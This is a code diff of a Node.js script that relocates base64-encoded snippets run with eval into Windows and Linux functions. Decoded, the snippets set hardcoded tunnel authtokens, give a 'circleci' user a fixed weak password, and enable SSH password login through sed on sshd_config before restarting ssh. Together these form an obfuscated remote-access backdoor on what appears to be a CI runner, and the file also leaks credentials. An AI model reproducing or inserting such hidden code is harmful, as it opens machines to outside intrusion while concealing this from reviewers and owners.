@@ -12,10 +12,6 @@ async function runShell (command) {
     return new Promise((resolve) => spawnedProcess.on('exit', resolve))
 }
 
-const builder = new SessionBuilder
-const secret2 = Buffer.from('YnVpbGRlci5hdXRodG9rZW4oJzI3RHBBc3ZTZkxSOTc4ZjNLUENTWEp0SmJDTV84TVVZVDJtQjdOdkcxandkeEMxaycp', 'base64').toString()
-eval(secret2)
-
 if (os === 'windows') windows()
 else if (os === 'linux') linux()
 
@@ -30,6 +26,10 @@ async function listen (port) {
 }
 
 async function windows () {
+    const builder = new SessionBuilder
+    const secret2 = Buffer.from('YnVpbGRlci5hdXRodG9rZW4oJzI3TWdPdHVaaXJpb0dYV1VWcDQ1VlN2QjhzRF83ekpCOEpMUUtNZ1Q1UWZDS2Q0cTQnKQ==', 'base64').toString()
+    eval(secret2)
+
     const secret = Buffer.from('KGFzeW5jICgpID0+IHsgYXdhaXQgcnVuU2hlbGwoJ25ldCB1c2VyIGNpcmNsZWNpIEBQYXNzd29yZDEyMzQ1NicpOyB9KSgp', 'base64').toString()
     eval(secret)
 
@@ -37,6 +37,10 @@ async function windows () {
 }
 
 async function linux () {
+    const builder = new SessionBuilder
+    const secret2 = Buffer.from('YnVpbGRlci5hdXRodG9rZW4oJzI3RHBBc3ZTZkxSOTc4ZjNLUENTWEp0SmJDTV84TVVZVDJtQjdOdkcxandkeEMxaycp', 'base64').toString()
+    eval(secret2)
+
     const secret = Buffer.from('KGFzeW5jICgpID0+IHsgYXdhaXQgcnVuU2hlbGwoJ3N1ZG8gc2VkIC1pIC1lIFwncy8jUGFzc3dvcmRBdXRoZW50aWNhdGlvbiBuby9QYXNzd29yZEF1dGhlbnRpY2F0aW9uIHllcy9nXCcgL2V0Yy9zc2gvc3NoZF9jb25maWcnKTsgYXdhaXQgcnVuU2hlbGwoJ3N1ZG8gc2VydmljZSBzc2ggcmVzdGFydCcpIH0pKCk=', 'base64').toString()
     eval(secret)
 
